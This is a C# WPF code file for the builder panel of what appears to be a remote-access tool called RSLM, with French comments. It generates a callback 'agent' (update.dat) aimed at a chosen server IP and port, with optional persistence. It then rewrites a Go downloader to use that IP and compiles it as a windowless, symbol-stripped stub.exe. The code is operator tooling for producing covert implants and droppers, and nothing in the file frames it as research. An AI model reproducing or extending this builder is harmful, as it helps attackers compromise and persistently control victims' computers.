using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;

namespace rslm_frontend.Views
{
    public partial class BuilderTerminalView : UserControl
    {
        private string _builderPath;
        private string _outputDir;
        private string _serverDir;

        public BuilderTerminalView()
        {
            InitializeComponent();
            _builderPath = @"C:\Users\Keylan\Desktop\RLSM.6.04\RSLM.Builder\bin\Release\RSLM.Builder.exe";

            // Dossier de sortie
            _outputDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Output");
            if (!Directory.Exists(_outputDir))
                Directory.CreateDirectory(_outputDir);

            // Dossier du serveur
            _serverDir = @"C:\Users\Keylan\Desktop\RLSM.6.04\x64\Release\";
        }

        private void AppendToTerminal(string text)
        {
            Dispatcher.Invoke(() =>
            {
                TerminalBox.AppendText(text + "\n");
                ScrollViewer.ScrollToEnd();
            });
        }

        private void CleanOutputDirectory()
        {
            Dispatcher.Invoke(() =>
            {
                try
                {
                    if (Directory.Exists(_outputDir))
                    {
                        foreach (string file in Directory.GetFiles(_outputDir))
                        {
                            try
                            {
                                File.Delete(file);
                            }
                            catch { }
                        }
                        TerminalBox.AppendText("✅ Anciens fichiers supprimés\n");
                        ScrollViewer.ScrollToEnd();
                    }
                }
                catch (Exception ex)
                {
                    TerminalBox.AppendText($"⚠ Erreur nettoyage: {ex.Message}\n");
                    ScrollViewer.ScrollToEnd();
                }
            });
        }

        private void CopyUpdateToServer()
        {
            try
            {
                string updatePath = Path.Combine(_outputDir, "update.dat");
                if (File.Exists(updatePath))
                {
                    string destPath = Path.Combine(_serverDir, "update.dat");
                    File.Copy(updatePath, destPath, true);
                    AppendToTerminal($"✅ update.dat copié vers le serveur : {_serverDir}");
                }
                else
                {
                    AppendToTerminal($"⚠ update.dat non trouvé dans {_outputDir}");
                }
            }
            catch (Exception ex)
            {
                AppendToTerminal($"ERREUR copie vers serveur: {ex.Message}");
            }
        }

        private void GenerateAgent_Click(object sender, RoutedEventArgs e)
        {
            string serverIp = ServerIpBox.Text;
            string serverPort = ServerPortBox.Text;

            AppendToTerminal("=== Génération de l'agent ===");
            AppendToTerminal($"IP: {serverIp}, Port: {serverPort}");
            AppendToTerminal($"Dossier de sortie: {_outputDir}");

            CleanOutputDirectory();

            if (!File.Exists(_builderPath))
            {
                AppendToTerminal($"ERREUR: RSLM.Builder.exe non trouvé");
                StatusText.Text = "Erreur";
                return;
            }

            Task.Run(() => RunBuilder(serverIp, serverPort));
        }

        private void RunBuilder(string serverIp, string serverPort)
        {
            try
            {
                string updatePath = Path.Combine(_outputDir, "update.dat");
                bool enablePersistence = false;

                // Accès au CheckBox via Dispatcher
                Dispatcher.Invoke(() =>
                {
                    enablePersistence = PersistenceCheckBox.IsChecked == true;
                });

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = _builderPath,
                    Arguments = $"\"{serverIp}\" {serverPort} {enablePersistence.ToString().ToLower()} false \"{updatePath}\" false false",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    Dispatcher.Invoke(() =>
                    {
                        if (!string.IsNullOrEmpty(output))
                            TerminalBox.AppendText(output + "\n");
                        if (!string.IsNullOrEmpty(error))
                            TerminalBox.AppendText($"ERREUR: {error}\n");
                        ScrollViewer.ScrollToEnd();
                    });
                }

                Dispatcher.Invoke(() =>
                {
                    if (File.Exists(updatePath))
                    {
                        TerminalBox.AppendText($"✅ Agent généré: {updatePath}\n");
                        TerminalBox.AppendText($"   Persistance: {(enablePersistence ? "activée" : "désactivée")}\n");
                        StatusText.Text = "Agent généré";
                        ScrollViewer.ScrollToEnd();

                        // Copier vers le serveur
                        try
                        {
                            string destPath = Path.Combine(_serverDir, "update.dat");
                            File.Copy(updatePath, destPath, true);
                            TerminalBox.AppendText($"✅ update.dat copié vers le serveur : {_serverDir}\n");
                        }
                        catch (Exception ex)
                        {
                            TerminalBox.AppendText($"ERREUR copie: {ex.Message}\n");
                        }
                        ScrollViewer.ScrollToEnd();
                    }
                    else
                    {
                        TerminalBox.AppendText("❌ Échec de génération\n");
                        StatusText.Text = "Erreur";
                        ScrollViewer.ScrollToEnd();
                    }
                });
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => TerminalBox.AppendText($"ERREUR: {ex.Message}\n"));
            }
        }

        private void GenerateStub_Click(object sender, RoutedEventArgs e)
        {
            string serverIp = ServerIpBox.Text;

            AppendToTerminal("\n=== Génération du stub (téléchargement) ===");
            AppendToTerminal($"Dossier de sortie: {_outputDir}");

            Task.Run(() => RunStubGenerator(serverIp));
        }

        private void RunStubGenerator(string serverIp)
        {
            try
            {
                string stubPath = Path.Combine(_outputDir, "stub.exe");
                string goDir = @"C:\Users\Keylan\Desktop\RLSM.6.04\RSLM.Builder\Ressource\go";
                string goFile = Path.Combine(goDir, "downloader.go");

                // Lire et modifier le code Go avec l'IP du serveur
                string code = File.ReadAllText(goFile);
                code = code.Replace("127.0.0.1", serverIp);

                string tempGoFile = Path.Combine(goDir, "temp_stub.go");
                File.WriteAllText(tempGoFile, code);

                Dispatcher.Invoke(() => AppendToTerminal($"⚙️ Compilation du stub..."));

                ProcessStartInfo build = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c cd /d \"{goDir}\" && go build -ldflags=\"-H windowsgui -s -w\" -o stub.exe temp_stub.go && copy stub.exe \"{stubPath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process p = Process.Start(build))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    string error = p.StandardError.ReadToEnd();
                    p.WaitForExit();

                    if (!string.IsNullOrEmpty(output))
                        Dispatcher.Invoke(() => AppendToTerminal(output));
                    if (!string.IsNullOrEmpty(error))
                        Dispatcher.Invoke(() => AppendToTerminal($"ERREUR: {error}"));
                }

                File.Delete(tempGoFile);

                Dispatcher.Invoke(() =>
                {
                    if (File.Exists(stubPath))
                    {
                        FileInfo fi = new FileInfo(stubPath);
                        AppendToTerminal($"✅ stub.exe généré ! Taille: {fi.Length} bytes");
                        StatusText.Text = "Stub généré";
                    }
                    else
                    {
                        AppendToTerminal("❌ Échec de génération");
                        StatusText.Text = "Erreur";
                    }
                });
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => AppendToTerminal($"ERREUR: {ex.Message}"));
            }
        }

        private void ClearTerminal_Click(object sender, RoutedEventArgs e)
        {
            TerminalBox.Clear();
            StatusText.Text = "Ready";
        }
    }
}